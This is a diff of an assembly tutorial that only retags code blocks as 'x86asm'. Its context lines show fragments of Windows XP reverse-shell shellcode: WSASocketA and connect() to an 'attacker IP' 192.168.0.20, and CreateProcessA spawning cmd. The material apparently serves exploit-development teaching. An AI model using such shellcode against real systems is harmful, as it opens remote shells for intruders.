@@ -136,7 +136,7 @@ We need to get a socket handle that can be used by a `TCP` connection.
 With that in mind, we can write the call to `WSASocketA()`:
 
 .WSASocketA() in ASM
-[source,asm]
+[source,x86asm]
 ----
 xor ebx,ebx             ; Zero out EBX
 push ebx                ; Push 'dwFlags' parameter
@@ -196,7 +196,7 @@ Now that we know the structure of the `connect()` function call
 and the address of the function, we can write it in Assembler:
 
 .connect() in Assembler
-[source,asm]
+[source,x86asm]
 ----
 push 0x1400a8c0         ; Push attacker IP: 192.168.0.20. In reverse order:
                         ; hex(20) = 0x14
@@ -222,7 +222,7 @@ and push the result. This will be the final `connect()` payload:
 
 
 .connect() in Assembler
-[source,asm]
+[source,x86asm]
 ----
 mov ebx,0x6955fe15      ; Attacker IP: 192.168.0.20. In reverse order:
                         ; hex(20) = 0x14
@@ -321,7 +321,7 @@ CreateProcessA is located at 0x7c80236b in kernel32
 In Assembler, the call to `CreateProcessA()` will look like this:
 
 .CreateProcessA() in Assembler
-[source,asm]
+[source,x86asm]
 ----
 mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid
                         ; injecting null bytes.
@@ -385,7 +385,7 @@ call ebx                ; Call CreateProcessA() on WinXPSP3
 Our final shellcode will be this:
 
 .shellcode.asm
-[source,asm]
+[source,x86asm]
 ----
 ; WSASocketA()
 xor ebx,ebx             ; Zero out EBX
@@ -596,7 +596,7 @@ All that's left to do is align the stack to point to that location,
 and it's done easily with two instructions:
 
 .Align stack
-[source,asm]
+[source,x86asm]
 ----
 PUSH EAX
 POP ESP
